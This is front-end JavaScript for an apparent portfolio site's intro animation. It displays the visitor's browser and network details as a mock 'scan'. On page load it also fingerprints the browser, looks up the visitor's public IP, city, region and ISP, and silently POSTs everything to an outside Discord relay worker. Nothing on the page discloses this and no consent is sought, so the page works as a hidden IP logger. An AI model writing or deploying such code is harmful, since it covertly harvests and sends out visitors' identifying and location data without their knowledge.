const output = document.querySelector('#output');
const welcome = document.querySelector('#welcome');
const continueButton = document.querySelector('#continue');
const intro = document.querySelector('#intro');
const portfolio = document.querySelector('#portfolio');
const reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;

const WORKER_URL = 'https://discord-relay.rogo57157.workers.dev';

const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function readable(value, fallback = 'unavailable') {
  return value === undefined || value === null || value === '' ? fallback : String(value);
}

async function networkDetails() {
  try {
    const response = await fetch('https://ipwho.is/', { cache: 'no-store' });
    if (!response.ok) throw new Error('Lookup failed');
    const data = await response.json();
    if (!data.success) throw new Error('Lookup unavailable');
    return {
      ip: readable(data.ip),
      network: [data.city, data.region, data.country].filter(Boolean).join(', ') || 'unavailable',
      timezone: readable(data.timezone?.id),
      org: readable(data.connection?.isp),
    };
  } catch {
    return { ip: 'unavailable', network: 'unavailable', timezone: 'unavailable', org: 'unavailable' };
  }
}

function browserDetails() {
  const nav = navigator;
  const screenInfo = window.screen;
  const connection = nav.connection || nav.mozConnection || nav.webkitConnection;
  return {
    'user agent': readable(nav.userAgent),
    platform: readable(nav.userAgentData?.platform || nav.platform),
    language: readable(nav.language),
    languages: nav.languages?.join(', ') || 'unavailable',
    viewport: `${window.innerWidth} × ${window.innerHeight}`,
    screen: `${screenInfo.width} × ${screenInfo.height} @ ${screenInfo.colorDepth}-bit`,
    'pixel ratio': readable(window.devicePixelRatio),
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unavailable',
    local_time: new Date().toLocaleString(),
    cookies: nav.cookieEnabled ? 'enabled' : 'disabled',
    'do not track': readable(nav.doNotTrack),
    online: nav.onLine ? 'yes' : 'no',
    connection: connection ? `${readable(connection.effectiveType)} / ${readable(connection.downlink)} Mbps` : 'unavailable',
    touch_points: readable(nav.maxTouchPoints),
    cpu_threads: readable(nav.hardwareConcurrency),
    device_memory: nav.deviceMemory ? `${nav.deviceMemory} GB` : 'unavailable',
  };
}

async function sendToWorker(facts) {
  try {
    await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(facts),
    });
  } catch {
    // Reporting failures should never break the page.
  }
}

async function typeLine(label, value, delay) {
  const line = document.createElement('p');
  line.className = 'line';
  const prefix = document.createElement('span');
  prefix.className = 'label';
  prefix.textContent = `[${label.toUpperCase()}] `;
  const content = document.createElement('span');
  content.className = 'value';
  line.append(prefix, content);
  output.append(line);

  const text = readable(value);
  if (reduceMotion) {
    content.textContent = text;
    return;
  }
  for (const character of text) {
    content.textContent += character;
    await wait(delay);
  }
  await wait(95);
}

async function run() {
  output.replaceChildren();
  welcome.hidden = true;
  continueButton.hidden = true;

  await typeLine('status', 'initializing browser observation...', 12);
  const local = browserDetails();
  const remote = await networkDetails();

  const facts = {
    ...local,
    'public ip': remote.ip,
    'approx. network location': remote.network,
    'network timezone': remote.timezone,
    'network provider': remote.org,
  };

  void sendToWorker(facts);

  for (const [label, value] of Object.entries(facts)) {
    await typeLine(label.replaceAll('_', ' '), value, 5);
  }

  await typeLine('scan', 'complete', 20);
  if (!reduceMotion) await wait(450);
  welcome.hidden = false;
  await wait(2000);
  continueButton.hidden = false;
}

continueButton.addEventListener('click', () => {
  intro.hidden = true;
  portfolio.hidden = false;
  window.scrollTo({ top: 0, behavior: reduceMotion ? 'auto' : 'smooth' });
});
run();
